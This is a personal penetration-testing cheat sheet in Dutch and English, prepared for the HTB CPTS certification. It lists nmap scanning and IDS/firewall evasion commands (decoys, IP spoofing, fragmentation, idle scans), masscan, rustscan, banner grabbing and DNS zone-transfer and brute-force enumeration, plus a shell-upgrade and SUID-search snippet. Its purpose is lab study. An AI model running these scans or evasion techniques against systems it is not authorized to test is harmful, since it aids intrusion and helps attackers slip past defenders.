---
tags: [cpts, cheatsheet, tools, htb, reference, pentesting, hacking]
created: 2026-01-18
updated: 2026-01-18
author: Leon Wintweer
---
sudo killall openvpn
# 📌 CPTS Tools - Complete Cheat Sheet

> **Voor**: HTB Academy, CPTS Certificering, Penetration Testing  
> **Doel**: Complete reference van alle essential tools en commands  
> **Update**: 2026-01-18  
> **Tip**: Gebruik Ctrl+F om snel te zoeken op tool naam, protocol, of port nummer

---

## 🎯 Mijn Persoonlijke Quick Reference

### ⚠️ KRITISCHE COMMANDS (Geleerd van Nibbles!)
```bash
# VPN ROUTING CHECK - ALTIJD EERST DOEN!
ip route get [TARGET_IP]

# VPN Interfaces bekijken
ip a | grep tun

# Welke VPN is actief?
ip route get [TARGET_IP]
# Output vertelt welke interface (tun0, tun1, tun2) wordt gebruikt!
```

### 🚀 Mijn Standard Workflow
```bash
# 1. Check VPN
ip route get [TARGET_IP]

# 2. Full Nmap Scan
sudo nmap -sS -sV -sC -p- -T4 -oA full_scan [TARGET_IP]

# 3. Web Enum (als port 80/443 open)
gobuster dir -u http://[TARGET] -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# 4. Check voor exploits
searchsploit [SERVICE] [VERSION]

# 5. Shell Upgrade (als je reverse shell hebt)
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg

# 6. Privilege Escalation Enum
sudo -l
find / -perm -4000 2>/dev/null
```

### 📚 Mijn HTB Journey

- ✅ [[Nibbles Box]] - Eerste box (3 dagen, VPN issues geleerd!)
- ✅ [[Getting Started Knowledge Check]] - Solo zonder walkthrough!
- 🔜 Volgende box...

### 💡 Belangrijkste Lessen

1. **ALTIJD `ip route get [TARGET_IP]` checken voordat je reverse shell setup!**
2. TTL waarden: 128 = Windows, 64 = Linux
3. Multiple VPN tunnels = problemen
4. Document alles real-time in Obsidian
5. Screenshots van flags met `whoami`

---

## 🔍 Quick Search Guide

**Search by tool name:** `TOOL:nmap`, `TOOL:hydra`, `TOOL:sqlmap`  
**Search by protocol:** `PROTO:http`, `PROTO:smb`, `PROTO:ssh`  
**Search by port:** `PORT:80`, `PORT:445`, `PORT:3389`  
**Search by category:** `CAT:enum`, `CAT:exploit`, `CAT:privesc`  
**Search by target OS:** `OS:linux`, `OS:windows`

---

## 📋 Inhoudsopgave

1. [Reconnaissance & Scanning](#reconnaissance--scanning)
2. [Banner Grabbing](#banner-grabbing)
3. [DNS Enumeration](#dns-enumeration)
4. [SMB Enumeration](#smb-enumeration)
5. [SNMP Enumeration](#snmp-enumeration)
6. [Web Enumeration](#web-enumeration)
7. [Exploitation](#exploitation)
8. [Password Attacks](#password-attacks)
9. [File Transfers](#file-transfers)
10. [Shells & Reverse Shells](#shells--reverse-shells)
11. [Post-Exploitation](#post-exploitation)
12. [Active Directory](#active-directory)
13. [Networking & Pivoting](#networking--pivoting)
14. [Wireless Attacks](#wireless-attacks)
15. [Database Attacks](#database-attacks)
16. [Miscellaneous](#miscellaneous)

---

# 🔍 Reconnaissance & Scanning

## TOOL:nmap CAT:enum CAT:recon

**PORT:all PROTO:tcp PROTO:udp**

### Basic Scans
```bash
# Quick scan top 1000 ports
nmap -T4 10.10.11.5

# All ports scan
nmap -p- 10.10.11.5

# Fast SYN scan (requires root)
sudo nmap -sS -T4 -p- 10.10.11.5

# Scan specific ports
nmap -p 80,443,8080 10.10.11.5

# Scan port range
nmap -p 1-1000 10.10.11.5

# Top 10 ports
nmap --top-ports=10 10.10.11.5

# Top 100 ports (fast scan)
nmap -F 10.10.11.5
```

### Service & Version Detection
```bash
# Version detection + default scripts
nmap -sV -sC 10.10.11.5

# Aggressive scan (OS detection, version, scripts, traceroute)
nmap -A 10.10.11.5

# Version intensity (0-9, higher = more probes)
nmap -sV --version-intensity 9 10.10.11.5

# OS detection
sudo nmap -O 10.10.11.5

# Detect service version only
nmap -sV 10.10.11.5
```

### Script Scanning
```bash
# All default scripts
nmap --script=default 10.10.11.5

# Specific script category
nmap --script=vuln 10.10.11.5

# Specific script
nmap --script=http-enum 10.10.11.5

# Multiple scripts
nmap --script=http-enum,http-headers,http-methods 10.10.11.5

# Script help
nmap --script-help http-enum

# List all scripts
ls /usr/share/nmap/scripts/
```

### Common Script Categories
```bash
# Vulnerability detection
nmap --script=vuln -p 445 10.10.11.5

# SMB enumeration PORT:445
nmap --script=smb-enum-shares,smb-enum-users -p 445 10.10.11.5
nmap --script=smb-os-discovery -p 445 10.10.11.5
nmap --script=smb-vuln* -p 445 10.10.11.5

# HTTP enumeration PORT:80
nmap --script=http-enum -p 80 10.10.11.5
nmap --script=http-title,http-headers -p 80 10.10.11.5

# SSL/TLS info PORT:443
nmap --script=ssl-cert,ssl-enum-ciphers -p 443 10.10.11.5

# FTP enumeration PORT:21
nmap --script=ftp-anon -p 21 10.10.11.5

# SSH enumeration PORT:22
nmap --script=ssh-auth-methods -p 22 10.10.11.5
```

### UDP Scanning
```bash
# Top 20 UDP ports
sudo nmap -sU --top-ports 20 10.10.11.5

# Specific UDP ports
sudo nmap -sU -p 53,161,162 10.10.11.5

# UDP version detection PORT:161 PROTO:snmp
sudo nmap -sUV -p 161 10.10.11.5

# Fast UDP scan (top 100)
sudo nmap -sU -F 10.10.11.5
```

### Stealth & Evasion
```bash
# SYN stealth scan (half-open)
sudo nmap -sS 10.10.11.5

# TCP connect scan (full connection)
nmap -sT 10.10.11.5

# Fragmented packets
nmap -f 10.10.11.5

# Decoy scan (hide among decoys)
nmap -D RND:10 10.10.11.5
nmap -D decoy1,decoy2,ME,decoy3 10.10.11.5

# Timing templates (0=slowest, 5=fastest)
nmap -T0 10.10.11.5  # Paranoid (IDS evasion)
nmap -T1 10.10.11.5  # Sneaky
nmap -T2 10.10.11.5  # Polite
nmap -T3 10.10.11.5  # Normal (default)
nmap -T4 10.10.11.5  # Aggressive
nmap -T5 10.10.11.5  # Insane

# Random data length
nmap --data-length 25 10.10.11.5

# Spoof source IP
sudo nmap -S SPOOFED_IP 10.10.11.5
```

### Output Formats
```bash
# Normal output
nmap -oN scan.txt 10.10.11.5

# XML output
nmap -oX scan.xml 10.10.11.5

# Grepable output
nmap -oG scan.grep 10.10.11.5

# All formats at once
nmap -oA scan 10.10.11.5

# Append to file
nmap -oN scan.txt --append-output 10.10.11.5
```

### Network Scanning
```bash
# Scan entire subnet
nmap 192.168.1.0/24

# Scan range
nmap 192.168.1.1-100

# Scan multiple targets
nmap 10.10.11.5 10.10.11.6 10.10.11.7

# Scan from file
nmap -iL targets.txt

# Exclude hosts
nmap 192.168.1.0/24 --exclude 192.168.1.1
nmap 192.168.1.0/24 --excludefile exclude.txt

# Skip ping (assume host is up)
nmap -Pn 10.10.11.5

# Ping scan only (no port scan)
nmap -sn 192.168.1.0/24
```

### Host Discovery
```bash
# ICMP echo request
nmap -PE 10.10.11.5

# ICMP timestamp
nmap -PP 10.10.11.5

# TCP SYN ping (port 80)
nmap -PS80 10.10.11.5

# TCP ACK ping (port 80)
nmap -PA80 10.10.11.5

# No ping
nmap -Pn 10.10.11.5

# ARP ping
nmap -PR 192.168.1.0/24

# Disable ARP ping
nmap --disable-arp-ping 10.10.11.5
```

### Advanced Options
```bash
# Packet trace (debug)
nmap --packet-trace 10.10.11.5

# Reason for port state
nmap --reason 10.10.11.5

# Verbose
nmap -v 10.10.11.5
nmap -vv 10.10.11.5

# Debug
nmap -d 10.10.11.5

# Max retries
nmap --max-retries 3 10.10.11.5

# Min/max rate
nmap --min-rate 1000 10.10.11.5
nmap --max-rate 5000 10.10.11.5
```

### CPTS Essential Nmap Commands
```bash
# Complete HTB scan
sudo nmap -sS -sV -sC -O -p- -T4 -oA full_scan 10.10.11.5

# Quick initial scan
nmap -sV -sC --top-ports=1000 -T4 10.10.11.5

# Thorough scan
sudo nmap -sS -sV -sC -A -p- --min-rate=1000 -T4 -oA thorough 10.10.11.5

# Stealth scan
sudo nmap -sS -Pn -f -T2 -oA stealth 10.10.11.5
```
# ============================================
# PERFORMANCE & TIMING OPTIMIZATION
# ============================================

# Retries (default: 10)
nmap --max-retries 0 10.10.11.5          # No retries (fastest, may miss info)
nmap --max-retries 3 10.10.11.5          # Balanced
nmap --max-retries 10 10.10.11.5         # Thorough (default)

# Minimum rate (packets per second)
nmap --min-rate 300 10.10.11.5           # Faster scan
nmap --min-rate 1000 10.10.11.5          # Very fast
nmap --min-rate 5000 10.10.11.5          # Ultra fast

# Maximum rate
nmap --max-rate 100 10.10.11.5           # Limit speed
nmap --max-rate 1000 10.10.11.5

# Combined rate control
nmap --min-rate 100 --max-rate 1000 10.10.11.5

# Timing Templates (-T 0-5)
nmap -T0 10.10.11.5    # Paranoid - Slowest, IDS evasion (serial, 5min between probes)
nmap -T1 10.10.11.5    # Sneaky - Slow, IDS evasion (serial, 15sec between probes)
nmap -T2 10.10.11.5    # Polite - Slower, less bandwidth (serial, 0.4sec between probes)
nmap -T3 10.10.11.5    # Normal - Default balanced timing
nmap -T4 10.10.11.5    # Aggressive - Fast, assumes good network (parallel)
nmap -T5 10.10.11.5    # Insane - Fastest, may sacrifice accuracy (parallel, short timeouts)

# Scan delay
nmap --scan-delay 1s 10.10.11.5          # Wait 1s between probes
nmap --scan-delay 100ms 10.10.11.5       # Wait 100ms between probes
nmap --max-scan-delay 2s 10.10.11.5      # Maximum delay between probes

# Host timeout
nmap --host-timeout 30m 10.10.11.5       # Give up on host after 30 minutes
nmap --host-timeout 5m 10.10.11.5        # 5 minutes per host

# ============================================
# PERFORMANCE COMPARISON EXAMPLES
# ============================================

# Default scan (baseline)
nmap -F 10.10.11.0/24 -oN default.txt
# Time: ~30 seconds, Found ports: 23

# Optimized with min-rate
nmap -F 10.10.11.0/24 --min-rate 300 -oN minrate300.txt
# Time: ~9 seconds, Found ports: 23

# Timing template T5 (Insane)
nmap -F 10.10.11.0/24 -T5 -oN insane.txt
# Time: ~18 seconds, Found ports: 23

# Ultra-fast full scan
nmap -p- --min-rate 5000 -T4 10.10.11.5
# Full 65535 ports in ~30 seconds

# Stealth vs Speed trade-off
nmap -p- -T2 --max-retries 1 10.10.11.5  # Slow but stealthy
nmap -p- -T4 --min-rate 1000 10.10.11.5  # Fast but noisy

# ============================================
# PRACTICAL USE CASES
# ============================================

# HTB Lab Scan (fast, good network)
nmap -p- --min-rate 5000 -T4 10.10.11.5

# Client Pentest (careful, avoid detection)
nmap -p- -T2 --max-retries 2 10.10.11.5

# Network Discovery (many hosts)
nmap 10.10.11.0/24 -F --min-rate 300 -T4

# Comprehensive but fast
nmap -p- -sV -sC --min-rate 1000 -T4 10.10.11.5

# ============================================
# COUNT FOUND PORTS
# ============================================

# Count open TCP ports in output
cat scan.nmap | grep "/tcp" | wc -l
cat scan.nmap | grep "open" | wc -l

# Extract only open ports
cat scan.nmap | grep "open" | awk '{print $1}'

# Summary of results
echo "Open ports found: $(cat scan.nmap | grep '/tcp' | grep 'open' | wc -l)"

# ============================================
# WARNINGS & BEST PRACTICES
# ============================================

# ⚠️ Too aggressive may cause:
# - Missed ports (false negatives)
# - IDS/IPS detection and blocking
# - Network congestion
# - Unreliable results

# ✅ Recommended combinations:
# - White-box/Lab: -T4 --min-rate 1000
# - Black-box: -T3 (default)
# - Stealth: -T2 --max-retries 2
# - Speed priority: -T4 --min-rate 5000 (HTB)
# - Accuracy priority: -T3 --max-retries 10

# 💡 Always verify fast scans:
# Run quick scan first, then verify with slower thorough scan
nmap -p- --min-rate 5000 -T4 10.10.11.5 -oN quick.txt
nmap -p $(cat quick.txt | grep "open" | awk '{print $1}' | cut -d'/' -f1 | tr '\n' ',') -sV -sC -T3 10.10.11.5
---

## TOOL:masscan CAT:enum CAT:recon

## 🎯 Nmap Performance Tips

### Snelheid vs Nauwkeurigheid:
- **HTB Labs**: Gebruik `-T4 --min-rate 5000` (snel netwerk, geen consequenties)
- **Real Pentests**: Begin met `-T3`, verhoog alleen als nodig
- **Stealth Required**: Gebruik `-T2 --max-retries 1`

### Timing Template Details:
| Template | Gebruik | Parallel | Tussen Probes | Timeouts |
|----------|---------|----------|---------------|----------|
| T0 | IDS Evasion | Nee | 5 min | Zeer lang |
| T1 | IDS Evasion | Nee | 15 sec | Lang |
| T2 | Beleefd | Nee | 0.4 sec | Normaal |
| T3 | **Default** | Ja | Dynamisch | Normaal |
| T4 | Snel | Ja | Kort | Kort |
| T5 | Zeer Snel | Ja | Zeer kort | Zeer kort |

### Verificatie Workflow:
```bash
# 1. Snelle discovery
nmap -p- --min-rate 5000 -T4 10.10.11.5 -oN quick.txt

# 2. Extract gevonden poorten
ports=$(cat quick.txt | grep "open" | awk '{print $1}' | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')

# 3. Grondige scan van gevonden poorten
nmap -p $ports -sV -sC -T3 10.10.11.5 -oA detailed
```

### Common Pitfalls:
- ❌ `--max-retries 0` kan poorten missen
- ❌ `-T5` op slechte verbindingen = onbetrouwbaar
- ❌ Te hoge `--min-rate` op langzame targets
- ✅ Start conservatief, optimaliseer daarna
- ✅ Vergelijk resultaten van verschillende snelheden
# ============================================
# FIREWALL & IDS/IPS EVASION
# ============================================

# ⚠️ WARNING: Use these techniques only in authorized penetration tests!
# Aggressive scans can trigger IPS blocks and ISP notifications.

# --------------------------------------------
# UNDERSTANDING PORT STATES WITH FIREWALLS
# --------------------------------------------

# Filtered ports can mean:
# - Dropped packets (no response)
# - Rejected packets (ICMP error response)

# Common ICMP error codes:
# - Type 3/Code 0: Net Unreachable
# - Type 3/Code 1: Host Unreachable  
# - Type 3/Code 3: Port Unreachable
# - Type 3/Code 9: Net Prohibited
# - Type 3/Code 10: Host Prohibited
# - Type 3/Code 13: Proto Unreachable

# --------------------------------------------
# ACK SCAN (Firewall Detection)
# --------------------------------------------

# TCP ACK scan bypasses many firewalls
# Firewalls often allow ACK packets (can't determine connection origin)
nmap -sA 10.10.11.5                          # ACK scan
nmap -sA -p 21,22,25 10.10.11.5              # Specific ports

# Compare SYN vs ACK scan results
sudo nmap 10.10.11.5 -p 21,22,25 -sS -Pn -n --disable-arp-ping --packet-trace
sudo nmap 10.10.11.5 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace

# Results interpretation:
# - unfiltered = Port accessible but can't determine open/closed
# - filtered = Firewall blocking
# - open/closed = Normal response (no firewall)

# --------------------------------------------
# DECOY SCANNING
# --------------------------------------------

# Hide your IP among decoys (makes detection harder)
nmap -D RND:5 10.10.11.5                     # 5 random decoy IPs
nmap -D RND:10 10.10.11.5                    # 10 random decoys

# Manual decoys
nmap -D decoy1,decoy2,ME,decoy3 10.10.11.5   # Your IP is "ME"
nmap -D 10.10.11.10,10.10.11.11,ME 10.10.11.5

# Decoy with specific scan
nmap -p 80 -sS -Pn -n --disable-arp-ping -D RND:5 10.10.11.5

# ⚠️ Important: Decoys must be alive hosts!
# Dead decoys can trigger SYN-flood protection

# --------------------------------------------
# SOURCE IP SPOOFING
# --------------------------------------------

# Use different source IP (test firewall rules)
sudo nmap 10.10.11.5 -S 10.10.11.200 -e tun0
sudo nmap 10.10.11.5 -n -Pn -p 445 -O -S 10.10.11.200 -e tun0

# Useful when:
# - Specific subnets are whitelisted
# - Testing if source IP affects access
# - Your IP is blocked

# Options:
# -S <IP>      Spoof source IP
# -e <iface>   Specify network interface (required with -S)

# --------------------------------------------
# SOURCE PORT MANIPULATION
# --------------------------------------------

# Use trusted source ports (often allowed through firewalls)
nmap --source-port 53 10.10.11.5             # DNS port
nmap --source-port 80 10.10.11.5             # HTTP port
nmap --source-port 443 10.10.11.5            # HTTPS port

# Common trusted ports:
# - 53 (DNS) - Often least filtered
# - 80 (HTTP)
# - 443 (HTTPS)
# - 20/21 (FTP)
# - 25 (SMTP)

# Example: Scan filtered port using DNS source port
sudo nmap 10.10.11.5 -p 50000 -sS -Pn -n --disable-arp-ping --source-port 53

# Test with netcat if successful
ncat -nv --source-port 53 10.10.11.5 50000

# --------------------------------------------
# DNS PROXYING
# --------------------------------------------

# Use specific DNS servers (trusted internal DNS)
nmap --dns-server 10.10.11.1 10.10.11.5
nmap --dns-server 8.8.8.8,1.1.1.1 10.10.11.5

# Useful in DMZ environments where internal DNS is trusted

# --------------------------------------------
# PACKET FRAGMENTATION
# --------------------------------------------

# Fragment packets to evade IDS/IPS
nmap -f 10.10.11.5                           # Fragment packets
nmap -ff 10.10.11.5                          # Even smaller fragments

# Custom MTU (Must be multiple of 8)
nmap --mtu 16 10.10.11.5
nmap --mtu 24 10.10.11.5

# Fragmentation helps bypass:
# - Simple packet filters
# - Some IDS signatures

# --------------------------------------------
# DATA LENGTH MANIPULATION
# --------------------------------------------

# Append random data to packets
nmap --data-length 25 10.10.11.5
nmap --data-length 50 10.10.11.5

# Makes packets harder to fingerprint

# --------------------------------------------
# TIMING & DELAYS (Stealth)
# --------------------------------------------

# Slow scans to avoid detection
nmap -T0 10.10.11.5                          # Paranoid (5 min between probes)
nmap -T1 10.10.11.5                          # Sneaky (15 sec between probes)
nmap -T2 10.10.11.5                          # Polite (0.4 sec between probes)

# Custom scan delays
nmap --scan-delay 5s 10.10.11.5              # 5 seconds between probes
nmap --max-scan-delay 10s 10.10.11.5         # Max delay

# Randomize host scan order
nmap --randomize-hosts 10.10.11.0/24

# --------------------------------------------
# IDLE/ZOMBIE SCAN
# --------------------------------------------

# Most stealthy scan (uses zombie host)
# Your IP never contacts target!
nmap -sI zombie_host target_host

# Example:
nmap -sI 10.10.11.100 10.10.11.5

# Requirements:
# - Zombie host with predictable IP ID sequence
# - Zombie host is idle (not generating traffic)

# Find potential zombies:
nmap --script ipidseq 10.10.11.0/24

# --------------------------------------------
# FW/IDS EVASION SCRIPTS
# --------------------------------------------

# Test for firewall
nmap --script firewall-bypass 10.10.11.5

# IDS evasion techniques
nmap --script-args=firewall-bypass.helper="helper" 10.10.11.5

# --------------------------------------------
# COMBINED EVASION TECHNIQUES
# --------------------------------------------

# Stealth scan (multiple techniques)
sudo nmap 10.10.11.5 -sS -f -T2 -D RND:10 --randomize-hosts -Pn

# Maximum stealth
sudo nmap 10.10.11.5 -sS -f --data-length 50 -T0 -D RND:5 \
  --source-port 53 --scan-delay 10s -Pn -n

# Firewall bypass attempt
sudo nmap 10.10.11.5 -sA --source-port 53 -f -D RND:5 -Pn

# DNS-based evasion
sudo nmap 10.10.11.5 --source-port 53 --dns-server 10.10.11.1 -f

# --------------------------------------------
# DETECTING IDS/IPS
# --------------------------------------------

# Strategy: Use multiple VPS with different IPs
# If one IP gets blocked → IPS is active

# Test for IDS/IPS:
# 1. Aggressive scan from VPS #1
nmap -T5 -A -p- 10.10.11.5

# 2. Check if VPS #1 is blocked
# 3. Continue with VPS #2 if blocked
# 4. Use stealthier techniques

# Indicators of IDS/IPS:
# - Sudden connection drops
# - IP blocking
# - Inconsistent scan results
# - No response after aggressive scan

# --------------------------------------------
# PRACTICAL EVASION WORKFLOW
# --------------------------------------------

# Step 1: Initial reconnaissance (gentle)
nmap -sS -p- -T2 10.10.11.5 -Pn

# Step 2: If ports show as filtered, try ACK scan
sudo nmap -sA -p <filtered_ports> 10.10.11.5 -Pn

# Step 3: Test trusted source ports
sudo nmap --source-port 53 -p <filtered_ports> 10.10.11.5 -Pn

# Step 4: Use decoys if still filtered
sudo nmap -D RND:10 --source-port 53 -p <filtered_ports> 10.10.11.5 -Pn

# Step 5: Fragment packets if IDS suspected
sudo nmap -f -D RND:10 --source-port 53 -p <filtered_ports> 10.10.11.5 -Pn

# Step 6: Try different source IP (if using VPS)
sudo nmap -S <VPS_IP> -e tun0 -p <filtered_ports> 10.10.11.5 -Pn

# --------------------------------------------
# TESTING SPECIFIC FIREWALL RULES
# --------------------------------------------

# Compare filtered vs unfiltered
sudo nmap 10.10.11.5 -p 445 -O -Pn              # Might show filtered
sudo nmap 10.10.11.5 -p 445 -O -S 10.10.11.200 -e tun0 -Pn  # Might bypass

# Test if source port matters
sudo nmap 10.10.11.5 -p 50000 -sS -Pn           # Standard
sudo nmap 10.10.11.5 -p 50000 -sS -Pn --source-port 53  # From DNS

# --------------------------------------------
# VERIFICATION AFTER EVASION
# --------------------------------------------

# If Nmap shows port as open after evasion, verify with nc/ncat
ncat -nv --source-port 53 10.10.11.5 50000

# Or with curl
curl --local-port 53 http://10.10.11.5:8080

# --------------------------------------------
# IMPORTANT WARNINGS & BEST PRACTICES
# --------------------------------------------

# ⚠️ CRITICAL WARNINGS:
# 1. IPS can block your IP permanently
# 2. ISP may be contacted if IPS triggers
# 3. Use multiple VPS/IP addresses for testing
# 4. Document what triggers blocks
# 5. Always have client authorization

# ✅ BEST PRACTICES:
# 1. Start with gentle scans (-T2)
# 2. Gradually increase aggression if needed
# 3. Use VPS for risky scans
# 4. Keep detailed logs
# 5. Respect scope and rules of engagement

# 💡 HTB SPECIFIC:
# HTB labs usually don't have IPS
# But practice evasion for real pentests:
nmap -sS -f -D RND:5 --source-port 53 -T2 10.10.11.5

# --------------------------------------------
# COMMON EVASION SCENARIOS
# --------------------------------------------

# Scenario 1: Port shows filtered
# Solution: Try ACK scan + source port 53
sudo nmap -sA --source-port 53 -p <port> 10.10.11.5 -Pn

# Scenario 2: Getting blocked after aggressive scan
# Solution: Use different IP (VPS) + slow timing
sudo nmap -T1 -f -D RND:10 10.10.11.5 -Pn

# Scenario 3: Subnet whitelist suspected
# Solution: Try different source IPs
sudo nmap -S 10.10.11.200 -e tun0 10.10.11.5 -Pn

# Scenario 4: All standard scans fail
# Solution: Try idle/zombie scan
nmap -sI <zombie_host> 10.10.11.5

# --------------------------------------------
# QUICK REFERENCE: EVASION FLAGS
# --------------------------------------------

# -f                      Fragment packets
# -ff                     Even smaller fragments
# --mtu <val>             Set MTU (multiple of 8)
# -D RND:<num>            Random decoys
# -D <decoy_list>         Specific decoys
# -S <IP>                 Spoof source IP
# -e <iface>              Specify interface
# --source-port <port>    Use specific source port
# --data-length <num>     Append random data
# -sA                     ACK scan (firewall mapping)
# -sI <zombie>            Idle scan
# -T0 to -T2              Slow timing (stealth)
# --scan-delay <time>     Delay between probes
# --dns-server <server>   Use specific DNS
# --randomize-hosts       Random scan order
**Fast port scanner**
```bash
# Ultra fast port scanner (all ports)
masscan -p1-65535 10.10.11.5 --rate=1000

# Scan specific ports
masscan -p80,443,8080 10.10.11.0/24 --rate=10000

# Output to file
masscan -p1-65535 10.10.11.5 --rate=1000 -oL masscan.txt
masscan -p1-65535 10.10.11.5 --rate=1000 -oX masscan.xml

# Banner grabbing
masscan -p80,443 10.10.11.0/24 --rate=10000 --banners

# Exclude ranges
masscan -p1-65535 10.10.11.0/24 --rate=1000 --exclude 10.10.11.1

# Source port
masscan -p80,443 10.10.11.0/24 --source-port 53

# Very fast scan
masscan -p1-65535 10.10.11.0/24 --rate=100000
```

---

## TOOL:rustscan CAT:enum CAT:recon

**Fast port discovery with nmap integration**
```bash
# Fast port discovery, then nmap
rustscan -a 10.10.11.5 -- -sV -sC

# Scan specific ports
rustscan -a 10.10.11.5 -p 80,443,8080

# Scan range
rustscan -a 10.10.11.0/24

# Custom batch size
rustscan -a 10.10.11.5 -b 1000

# Scan all ports
rustscan -a 10.10.11.5 --range 1-65535

# Timeout
rustscan -a 10.10.11.5 -t 1500

# Accessible mode (slow but accessible)
rustscan -a 10.10.11.5 --accessible
```

---

# 🎯 Banner Grabbing

## TOOL:netcat TOOL:nc CAT:enum CAT:recon

**PORT:21 PORT:22 PORT:25 PORT:80 PORT:110 PORT:143 PORT:443 PORT:3306 PORT:3389**
```bash
# Basic banner grabbing
nc -nv 10.10.11.5 21    # PROTO:ftp
nc -nv 10.10.11.5 22    # PROTO:ssh
nc -nv 10.10.11.5 25    # PROTO:smtp
nc -nv 10.10.11.5 80    # PROTO:http
nc -nv 10.10.11.5 110   # PROTO:pop3
nc -nv 10.10.11.5 143   # PROTO:imap
nc -nv 10.10.11.5 443   # PROTO:https
nc -nv 10.10.11.5 3306  # PROTO:mysql
nc -nv 10.10.11.5 3389  # PROTO:rdp

# With timeout
nc -nvw 3 10.10.11.5 80

# HTTP banner (manual request) PORT:80 PROTO:http
echo -e "GET / HTTP/1.0\r\n\r\n" | nc -nv 10.10.11.5 80
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -nv 10.10.11.5 80

# SMTP enumeration PORT:25 PROTO:smtp
nc -nv 10.10.11.5 25
EHLO test
VRFY root
VRFY admin
EXPN root

# FTP enumeration PORT:21 PROTO:ftp
nc -nv 10.10.11.5 21
USER anonymous
PASS anonymous
SYST
STAT
HELP

# POP3 PORT:110 PROTO:pop3
nc -nv 10.10.11.5 110
USER username
PASS password
LIST
STAT

# IMAP PORT:143 PROTO:imap
nc -nv 10.10.11.5 143
A1 LOGIN username password
A2 LIST "" "*"
A3 SELECT INBOX
```

---

## TOOL:telnet CAT:enum

**Banner grabbing alternative**
```bash
# HTTP banner PORT:80
telnet 10.10.11.5 80
GET / HTTP/1.0

# SMTP PORT:25
telnet 10.10.11.5 25
EHLO test
VRFY root

# POP3 PORT:110
telnet 10.10.11.5 110
USER username
PASS password

# IMAP PORT:143
telnet 10.10.11.5 143
a1 LOGIN username password
a2 LIST "" "*"

# FTP PORT:21
telnet 10.10.11.5 21
USER anonymous
PASS anonymous
```

---

## TOOL:openssl CAT:enum

**SSL/TLS enumeration PORT:443 PORT:465 PORT:993 PORT:995**
```bash
# SSL/TLS banner
openssl s_client -connect 10.10.11.5:443

# Show certificate
openssl s_client -connect 10.10.11.5:443 -showcerts

# SMTP with STARTTLS PORT:25 PORT:587
openssl s_client -connect 10.10.11.5:25 -starttls smtp
openssl s_client -connect 10.10.11.5:587 -starttls smtp

# IMAP with STARTTLS PORT:143
openssl s_client -connect 10.10.11.5:143 -starttls imap

# POP3 with STARTTLS PORT:110
openssl s_client -connect 10.10.11.5:110 -starttls pop3

# FTP with STARTTLS PORT:21
openssl s_client -connect 10.10.11.5:21 -starttls ftp

# Check specific TLS version
openssl s_client -connect 10.10.11.5:443 -tls1
openssl s_client -connect 10.10.11.5:443 -tls1_1
openssl s_client -connect 10.10.11.5:443 -tls1_2
openssl s_client -connect 10.10.11.5:443 -tls1_3

# Show all SSL/TLS info
openssl s_client -connect 10.10.11.5:443 -showcerts -servername target.com

# Cipher suites
openssl s_client -connect 10.10.11.5:443 -cipher 'ECDHE-RSA-AES256-GCM-SHA384'

# Test for Heartbleed
openssl s_client -connect 10.10.11.5:443 -tlsextdebug
```

---

# 🌐 DNS Enumeration

## TOOL:dig CAT:enum PROTO:dns PORT:53
```bash
# Basic query
dig target.com

# Specific record type
dig target.com A      # IPv4 address
dig target.com AAAA   # IPv6 address
dig target.com MX     # Mail servers
dig target.com NS     # Name servers
dig target.com TXT    # Text records
dig target.com SOA    # Start of Authority
dig target.com CNAME  # Canonical name
dig target.com PTR    # Pointer record

# Query specific nameserver
dig @8.8.8.8 target.com
dig @1.1.1.1 target.com
dig @ns1.target.com target.com

# Reverse DNS lookup
dig -x 10.10.11.5
dig -x 8.8.8.8

# Zone transfer (AXFR)
dig axfr @ns1.target.com target.com
dig axfr target.com @ns1.target.com

# ANY query (all records)
dig target.com ANY

# Short output
dig target.com +short
dig target.com MX +short

# Trace DNS path
dig target.com +trace

# No recursion
dig target.com +norecurse

# Show query time
dig target.com +stats

# Multiple queries
dig target.com A target.com MX
```

---

## TOOL:host CAT:enum PROTO:dns
```bash
# Basic query
host target.com

# Specific query type
host -t A target.com
host -t AAAA target.com
host -t mx target.com
host -t ns target.com
host -t txt target.com
host -t soa target.com
host -t cname target.com

# Reverse lookup
host 10.10.11.5
host 8.8.8.8

# Zone transfer
host -l target.com ns1.target.com

# Query specific nameserver
host target.com 8.8.8.8

# Verbose
host -v target.com

# All records
host -a target.com
```

---

## TOOL:nslookup CAT:enum PROTO:dns
```bash
# Basic query
nslookup target.com

# Query specific server
nslookup target.com 8.8.8.8

# Interactive mode
nslookup
> server 8.8.8.8
> set type=mx
> target.com
> set type=ns
> target.com
> exit

# Reverse lookup
nslookup 10.10.11.5

# Debug mode
nslookup -debug target.com

# Query type
nslookup -type=mx target.com
nslookup -type=ns target.com
nslookup -type=txt target.com
```

---

## TOOL:dnsrecon CAT:enum PROTO:dns
```bash
# Standard enumeration
dnsrecon -d target.com

# Zone transfer
dnsrecon -d target.com -t axfr

# Brute force subdomains
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt
dnsrecon -d target.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Reverse lookup on range
dnsrecon -r 10.10.11.0/24

# Standard + brute force
dnsrecon -d target.com -t std

# Google search
dnsrecon -d target.com -t goo

# Bing search
dnsrecon -d target.com -t bing

# Cache snooping
dnsrecon -d target.com -t snoop

# With specific nameserver
dnsrecon -d target.com -n ns1.target.com

# JSON output
dnsrecon -d target.com -j dnsrecon.json

# XML output
dnsrecon -d target.com -x dnsrecon.xml
```

---

## TOOL:dnsenum CAT:enum PROTO:dns
```bash
# Basic enumeration
dnsenum target.com

# With wordlist
dnsenum --dnsserver 8.8.8.8 --enum -f /usr/share/wordlists/subdomains.txt target.com
dnsenum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt target.com

# With threads
dnsenum --threads 10 target.com

# Skip reverse lookup
dnsenum --noreverse target.com

# Output file
dnsenum -o dnsenum.txt target.com

# Private ranges
dnsenum -p 0 -s 15 target.com
```

---

## TOOL:fierce CAT:enum PROTO:dns
```bash
# Basic scan
fierce --domain target.com

# With DNS server
fierce --domain target.com --dns-servers 8.8.8.8

# Subdomain brute force
fierce --domain target.com --subdomain-file /usr/share/wordlists/subdomains.txt
fierce --domain target.com --subdomain-file /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

